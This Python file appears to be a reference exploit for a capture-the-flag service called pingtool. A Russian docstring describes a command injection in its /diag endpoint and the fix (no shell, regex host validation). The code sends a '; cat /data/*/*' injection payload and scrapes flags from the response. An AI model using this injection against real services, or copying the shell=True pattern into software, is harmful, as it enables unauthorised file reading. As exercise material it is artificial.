"""ЭТАЛОН: pingtool — инъекция команд в /diag.

Уязвимость: /diag строит строку "ping -c 1 -W 1 " + host и выполняет через shell=True.
host управляется атакующим -> подставляем "; cat ..." и читаем файлы, куда /save
кладёт заметки всех пользователей (там флаги чекера).

Патч (services/pingtool/app.py, diag): не звать shell. Напр.:
    subprocess.run(["ping","-c","1","-W","1", host], shell=False, ...)
и/или валидировать host регекспом ^[a-zA-Z0-9.\\-]+$. SLA (ping 127.0.0.1) не ломается.
"""
import re
import requests

SERVICE = "pingtool"
FLAG = re.compile(r"[A-Z0-9]{31}=")


def exploit(host, port):
    base = f"http://{host}:{port}"
    payload = {"host": "127.0.0.1; cat /data/*/* 2>/dev/null"}
    try:
        r = requests.post(f"{base}/diag", json=payload, timeout=4)
    except requests.RequestException:
        return []
    j = r.json()
    return FLAG.findall((j.get("stdout", "") or "") + (j.get("stderr", "") or ""))
